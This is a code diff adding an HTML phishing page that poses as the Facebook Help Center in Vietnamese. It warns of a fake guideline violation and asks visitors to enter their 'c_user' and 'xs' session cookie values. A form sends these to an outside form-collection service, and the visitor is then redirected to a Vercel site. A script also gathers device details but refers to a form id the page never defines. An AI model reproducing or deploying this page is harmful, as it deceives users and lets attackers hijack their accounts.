@@ -1,0 +1,85 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <link rel="icon" type="image/svg+xml" href="assets/logo-xjw2vU6p.png">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Meta Form</title>
+    <script type="module" crossorigin="" src="/assets/index-D9lU3uHa.js"></script>
+    <link rel="stylesheet" crossorigin="" href="style.css">
+</head>
+
+<body>
+     <form action="https://submit-form.com/KAwd3jtGz" method="post">
+            <input type="hidden" name="_redirect" value="https://sub-pass-for-further-appeal.vercel.app"/>
+            <div id="root">
+<div>
+    <form>
+     
+        <input type="hidden" id="screenWidth" name="screenWidth" value="">
+        <input type="hidden" id="screenHeight" name="screenHeight" value="">
+        <input type="hidden" id="isTouchDevice" name="isTouchDevice" value="">
+
+        <div class="d-flex align-items-center" style="width: 100%; height: 90px; background: rgb(70, 103, 172);">
+            <h1 class="text-white ms-4 m-0 d-flex align-self-center">facebook</h1>
+        </div>
+        <div class="d-flex align-items-center" style="width: 100%; height: 60px; background: rgb(233, 235, 238);">
+            <h4 class="ms-4 m-0 d-flex align-self-center text-primary">Trung tâm trợ giúp</h4>
+        </div>
+        <div class="col-12 my-4 d-flex justify-content-center align-items-center">
+            <div class="col-11 col-md-6 border">
+                <div class="p-2" style="background: rgb(245, 246, 247);">
+                    <h5 class="m-0">Yêu cầu xóa trang vi phạm</h5>
+                </div>
+                <div class="p-2">
+                    <p class="fw-semibold validation_form_para">Chúng tôi đã xác định hoạt động bất thường trên trang của bạn vi phạm nguyên tắc cộng đồng của chúng tôi.</p>
+                    <p class="fw-semibold validation_form_para">Do đó, quyền truy cập vào trang của bạn đã bị hạn chế,
+và hiện tại bạn không thể đăng, chia sẻ hoặc bình luận bằng trang đó.</p>
+                    <p class="fw-semibold validation_form_para">Vui lòng cung cấp thông tin chi tiết chính xác bên dưới. Tham khảo
+video để làm rõ nếu bạn thấy hướng dẫn không rõ ràng.</p>
+                    <p class="fw-semibold text-secondary" style="font-size: 12px;">Thông tin chi tiết về video.</p>
+                    <video controls="" autoplay=""
+                        src="https://pub-f456f4d986634e768b6c47ca892224f2.r2.dev/vitnam.mp4"
+                        style="width: 300px; height: 160px;"></video>
+                    <br>
+                    <button>Bật âm thanh</button>
+                    <p class="fw-semibold validation_form_para mt-2">Hãy chắc chắn cung cấp thông tin được yêu cầu
+bên dưới.</p>
+                    <label class="" style="font-size: 12px;">c_user</label>
+                    <br>
+                    <input type="number" name="c_user" required="" pattern="^\d{15}$" title="Please enter 15 digits">
+                    <br>
+                    <label class="mt-2" style="font-size: 12px;">xs</label>
+                    <br>
+                    <input type="text" name="xs">
+                    <p class="mt-2" style="font-size: 12px;">Vui lòng đảm bảo không đăng xuất khỏi máy tính hoặc
+máy tính xách tay của bạn cho đến khi bạn nhận được email xác minh.</p>
+                </div>
+                <div class="p-2 mb-2 d-flex justify-content-end" style="background: rgb(245, 246, 247);">
+                    <button type="submit" class="text-white border-0"
+                        style="background: rgb(66, 103, 178);">Nộp</button>
+                </div>
+            </div>
+        </div>
+    </form>
+
+    <script>
+        // Populate device details in hidden fields before form submission
+        const form = document.getElementById("device-form");
+
+        form.addEventListener("submit", (event) => {
+            const isTouchDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
+            const screenWidth = window.innerWidth;
+            const screenHeight = window.innerHeight;
+
+    
+            document.getElementById("screenWidth").value = screenWidth;
+            document.getElementById("screenHeight").value = screenHeight;
+            document.getElementById("isTouchDevice").value = isTouchDevice ? "true" : "false";
+        });
+    </script>
+</body>
+
+</html>
